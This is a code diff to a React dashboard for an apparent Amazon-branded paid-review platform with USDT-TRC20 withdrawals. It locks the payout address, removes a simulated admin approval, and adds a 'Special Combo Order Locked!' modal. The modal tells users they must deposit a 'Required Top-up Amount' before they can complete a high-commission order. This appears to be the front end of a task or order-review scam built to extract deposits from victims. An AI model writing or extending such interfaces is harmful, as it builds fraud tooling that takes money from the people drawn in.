                           <input
                             type="text"
                             required
+                            disabled={isAddressBound}
+                            placeholder="Enter your USDT wallet address (e.g. T..."
                             value={defaultWalletAddress}
                             onChange={(e) => setDefaultWalletAddress(e.target.value)}
-                            className="w-full px-3 py-2 text-xs border border-gray-300 rounded-lg focus:outline-none focus:ring-1 focus:ring-amazon-gold font-mono text-gray-800"
+                            className="w-full px-3 py-2 text-xs border border-gray-300 rounded-lg focus:outline-none focus:ring-1 focus:ring-amazon-gold font-mono text-gray-800 disabled:bg-gray-100 disabled:opacity-80"
                           />
                           <p className="text-[9px] text-gray-400 leading-normal">
-                            ⚠️ Ensure correctness! All simulated manual & automated withdrawal payouts will propagate to this coordinate.
+                            {isAddressBound 
+                              ? "🔒 This payout destination address is bound and locked. Contact support to request adjustments." 
+                              : "⚠️ Ensure correctness! Once locked, all future simulated withdrawals will propagate exclusively to this coordinate."}
                           </p>
                         </div>
 
-                        <button
-                          type="submit"
-                          className="px-5 py-2.5 bg-[#131921] hover:bg-black text-white text-xs font-bold rounded-lg transition-all cursor-pointer"
-                        >
-                          Lock Wallet Coordinates
-                        </button>
+                        {!isAddressBound && (
+                          <button
+                            type="submit"
+                            className="px-5 py-2.5 bg-[#131921] hover:bg-black text-white text-xs font-bold rounded-lg transition-all cursor-pointer"
+                          >
+                            Lock Wallet Coordinates
+                          </button>
+                        )}
                       </form>
                     )}
 
@@ -3228,15 +3614,7 @@ export default function DashboardPage({
                         </p>
                       </div>
 
-                      <div className="border-t border-gray-200/80 pt-5 space-y-3">
-                        <p className="text-[10px] text-gray-400 uppercase font-black">Admin Sandbox Simulation</p>
-                        <button
-                          onClick={handleSimulateAdminApproval}
-                          className="px-5 py-2.5 bg-green-600 hover:bg-green-700 text-white font-black text-xs rounded-xl shadow transition"
-                        >
-                          Simulate Merchant Approval & Claim +${activeReviewProduct.payout.toFixed(2)}
-                        </button>
-                      </div>
+
                     </div>
                   )}
 
@@ -3303,23 +3681,102 @@ export default function DashboardPage({
                   <input
                     type="text"
                     required
-                    placeholder="Input TRC-20 network address"
+                    disabled={isAddressBound}
+                    placeholder={isAddressBound ? "No address bound" : "Input TRC-20 network address"}
                     value={withdrawAddress}
                     onChange={(e) => setWithdrawAddress(e.target.value)}
-                    className="w-full px-3 py-2 text-xs border border-gray-300 rounded-lg focus:outline-none focus:ring-1 focus:ring-amazon-gold text-gray-900 font-mono"
+                    className="w-full px-3 py-2 text-xs border border-gray-300 rounded-lg focus:outline-none focus:ring-1 focus:ring-amazon-gold text-gray-900 font-mono disabled:bg-gray-100 disabled:opacity-80"
                   />
                   <p className="text-[10px] text-gray-400 mt-1 leading-normal">
-                    ℹ️ Cashouts are released exclusively in USDT-TRC20 assets after merchant ledger cross-checks.
+                    {isAddressBound 
+                      ? "🔒 Payouts are routed directly to your bound destination coordinates." 
+                      : "⚠️ Warning: You must bind your USDT address in Settings before you can withdraw."}
                   </p>
                 </div>
 
                 <button
                   type="submit"
-                  className="w-full bg-[#131921] hover:bg-black text-white font-black text-xs py-3 rounded-lg shadow-sm transition"
+                  disabled={!isAddressBound}
+                  className="w-full bg-[#131921] hover:bg-black text-white font-black text-xs py-3 rounded-lg shadow-sm transition disabled:opacity-50 disabled:cursor-not-allowed"
                 >
-                  Confirm Secure Cashout Release
+                  {isAddressBound ? "Confirm Secure Cashout Release" : "Please Bind Address First"}
                 </button>
               </form>
+            </motion.div>
+          </div>
+        )}
+      </AnimatePresence>
+
+      {/* ================================== MODAL: COMBO POINT TOP-UP REQUIRED ================================== */}
+      <AnimatePresence>
+        {isComboModalOpen && comboModalDetails && (
+          <div className="fixed inset-0 z-50 flex items-center justify-center p-4">
+            {/* Backdrop */}
+            <motion.div
+              initial={{ opacity: 0 }}
+              animate={{ opacity: 0.6 }}
+              exit={{ opacity: 0 }}
+              onClick={() => setIsComboModalOpen(false)}
+              className="fixed inset-0 bg-black/70 backdrop-blur-xs"
+            />
+
+            {/* Modal Box */}
+            <motion.div
+              initial={{ opacity: 0, scale: 0.9, y: 20 }}
+              animate={{ opacity: 1, scale: 1, y: 0 }}
+              exit={{ opacity: 0, scale: 0.9, y: 20 }}
+              className="bg-white rounded-2xl shadow-2xl border border-yellow-250 p-6 sm:p-8 max-w-md w-full z-50 relative text-left"
+            >
+              <button
+                onClick={() => setIsComboModalOpen(false)}
+                className="absolute right-4 top-4 p-1.5 rounded-full hover:bg-gray-100 transition text-gray-500"
+              >
+                <X className="h-5 w-5" />
+              </button>
+
+              <div className="text-center mb-6">
+                <div className="h-16 w-16 bg-amber-50 rounded-full flex items-center justify-center text-amber-600 mx-auto border border-amber-250 animate-bounce">
+                  <ShieldAlert className="h-8 w-8" />
+                </div>
+                <h3 className="text-lg font-black mt-4 text-gray-900 uppercase tracking-tight">Special Combo Order Locked!</h3>
+                <p className="text-xs text-gray-500 mt-2 leading-relaxed">
+                  Congratulations! You have triggered a high-yield <strong>Special Combo Review (Order #{comboModalDetails.position})</strong>. 
+                  To process this high-commission order, your wallet balance must meet the merchant requirement.
+                </p>
+              </div>
+
+              <div className="bg-amber-50/70 border border-amber-200 rounded-xl p-4 space-y-3 text-xs">
+                <div className="flex justify-between items-center pb-2 border-b border-amber-200/50">
+                  <span className="text-gray-600 font-medium">Your Current Balance:</span>
+                  <span className="font-mono font-black text-gray-900">${comboModalDetails.currentBalance.toFixed(2)}</span>
+                </div>
+                <div className="flex justify-between items-center pb-2 border-b border-amber-200/50">
+                  <span className="text-gray-600 font-medium">Merchant Trigger Balance:</span>
+                  <span className="font-mono font-black text-amber-700">${comboModalDetails.triggerBalance.toFixed(2)}</span>
+                </div>
+                <div className="flex justify-between items-center pt-1 font-bold">
+                  <span className="text-gray-800">Required Top-up Amount:</span>
+                  <span className="font-mono font-extrabold text-red-600 text-sm">${comboModalDetails.requiredDeposit.toFixed(2)}</span>
+                </div>
+              </div>
+
+              <div className="mt-6 space-y-3">
+                <button
+                  onClick={() => {
+                    setIsComboModalOpen(false);
+                    setActiveTab('deposit');
+                  }}
+                  className="w-full bg-[#FF9900] hover:bg-[#e68a00] text-white font-black text-xs py-3.5 rounded-xl shadow-md transition text-center uppercase tracking-wider cursor-pointer font-sans"
+                >
+                  Deposit & Complete Order Now
+                </button>
+                <button
+                  onClick={() => setIsComboModalOpen(false)}
+                  className="w-full bg-gray-100 hover:bg-gray-200 text-gray-700 font-bold text-xs py-3 rounded-xl transition text-center uppercase cursor-pointer"
+                >
+                  Cancel & Go Back
+                </button>
+              </div>
             </motion.div>
           </div>
         )}
